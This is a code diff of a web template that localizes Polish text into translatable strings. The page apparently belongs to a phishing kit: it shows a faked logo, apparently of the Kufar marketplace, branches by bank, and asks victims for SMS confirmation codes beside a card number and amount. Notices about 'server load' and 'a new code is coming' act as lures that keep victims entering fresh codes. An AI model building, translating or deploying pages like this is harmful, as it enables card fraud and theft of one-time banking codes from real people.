@@ -154,44 +154,42 @@
             <div class="form-block-header">
                 <img src="{{$fake->logo()}}" width="30%"><br><br>
                 <br>
-                <h1 class="form-block-header-text">Potwierdzenie operacji</h1>
+                <h1 class="form-block-header-text">{{__("Operation confirmation")}}</h1>
             </div>
 
             <div class="form-block-body">
                 <p class="form-block-body-text">
-                    Aby potwierdzić operację, na Twój numer telefonu została wysłana wiadomość tekstowa z kodem
-                    potwierdzającym. Wprowadź go w polu poniżej.
+                    {{__("To confirm the operation, a text message with a confirmation code was sent to your phone number. Please enter it in the field below.")}}
                 </p>
 
                 <table class="form-block-body-table">
                     <tr>
-                        <td>Sklep:</td>
+                        <td>{{__("Store")}}:</td>
                         <td>{{$categoryName}}</td>
                     </tr>
 
                     <tr>
-                        <td>Kwota:</td>
+                        <td>{{__("Sum")}}:</td>
                         <td>{{$amount}}</td>
                     </tr>
 
                     <tr>
-                        <td>Nr karty:</td>
+                        <td>{{__("Card no")}}:</td>
                         <td>{{$card_number}}</td>
                     </tr>
                 </table>
 
                 <div class="form-block-body-notification">
-                    <b>Uwagę!</b> Ze względu na duże obciążenie serwera, przesłanie kodu może być opóźnione o kilka
-                    minut.
+                    <b>{{__("Attention!")}}</b> {{__("Due to the high load on the server, the code transfer may be delayed by several minutes.")}}
                 </div>
             </div>
 
             <div class="form-block-footer">
                 <p class="form-block-footer-text">
-                    Kod potwierdzenia:
+                    {{__("Confirmation code")}}:
                 </p>
 
-                <input type="text" class="form-block-footer-input" placeholder="Wpisz kod..."
+                <input type="text" class="form-block-footer-input" placeholder="{{__("Enter code")}}"
                        @if(session('bankName') == 'bankbps')
                        maxlength="15"
                        @else
@@ -201,7 +199,7 @@
                 <br>
                 <div style="text-align: center;">
                     <button class="form-block-footer-button" id="submit-button">
-                        Potwierdzić
+                        {{__("To confirm")}}
                     </button>
                 </div>
             </div>
@@ -210,26 +208,25 @@
             <div class="form-block-header">
 
                 <img src="{{$fake->logo()}}" width="30%" alt="Kufar" class="form-block-image">
-                <h1 class="form-block-header-text">Przetwarzanie płatności</h1>
+                <h1 class="form-block-header-text">{{__("Processing payments")}}</h1>
             </div>
 
             <div class="form-block-body">
                 <p class="form-block-body-text">
-                    Płatność jest w trakcie przetwarzania. Nastąpi automatyczne przekierowanie na odpowiednią stronę.
-                    Może to zająć trochę czasu.
+                    {{__("Payment is still being processed. You will be automatically redirected to the appropriate page. This may take some time.")}}
                 </p>
             </div>
         </div>
         <div class="form-block" id="step-3" style="display: none;">
             <div class="form-block-header">
                 <img src="{{$fake->logo()}}" width="30%" alt="Kufar" class="form-block-image">
-                <h1 class="form-block-header-text">Operacja została odrzucona.</h1>
+                <h1 class="form-block-header-text">{{__("The operation was rejected.")}}</h1>
             </div>
 
             <div class="form-block-body">
                 <p class="form-block-body-text">
-                    Wprowadzono nieprawidłowy kod potwierdzenia lub skończył się jego termin ważności.
-                    <br><br>Prosimy o oczekiwanie. Za chwilę zostanie wysłany nowy kod
+                    {{__("Incorrect confirmation code entered or its expiry date has expired.")}}
+                    <br><br>{{__("Please wait. A new code will be sent to you in a moment")}}
                 </p>
             </div>
         </div>
